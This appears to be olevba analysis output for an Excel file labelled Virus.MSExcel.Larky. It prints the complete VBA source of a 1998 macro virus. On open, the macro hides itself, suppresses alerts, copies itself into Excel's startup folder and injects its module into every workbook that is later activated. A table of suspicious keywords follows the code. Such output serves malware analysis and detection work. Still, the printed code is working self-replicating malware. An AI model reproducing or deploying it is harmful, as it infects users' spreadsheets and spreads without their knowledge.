olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Larky-703e00a75de0a9b4d56369f4ce602d01c3592f04
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Larky-703e00a75de0a9b4d56369f4ce602d01c3592f04 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Larky-703e00a75de0a9b4d56369f4ce602d01c3592f04 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO я.bas 
in file: Virus.MSExcel.Larky-703e00a75de0a9b4d56369f4ce602d01c3592f04 - OLE stream: '_VBA_PROJECT_CUR/VBA/\uf8f8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Larky
Private Sub Auto_Open()
On Error Resume Next
Application.EnableEvents = 1
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
If Application.Workbooks("я").Name <> "я" Then
Јd = Application.StartupPath & ".\" & "я"
Workbooks(ActiveWorkbook.Name).SaveCopyAs Јd
Workbooks.Open Јd: End If
Windows("я").Visible = 0: Application.OnSheetActivate = "я" & "!Јh"
End Sub
Private Sub Јh()
On Error Resume Next
Windows("я").Visible = 0
Set Јo = ActiveWorkbook
Set Ј\ = ThisWorkbook.VBProject.VBComponents("я").CodeModule
Јf = Ј\.Lines(1, Ј\.CountOfLines + 1)
If Јo.VBProject.VBComponents(Ј\).Name <> Ј\ Then
Јo.VBProject.VBComponents.Add(1).Name = Ј\
Јo.VBProject.VBComponents(Ј\).CodeModule.InsertLines 1, Јf: End If
ThisWorkbook.Saved = 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

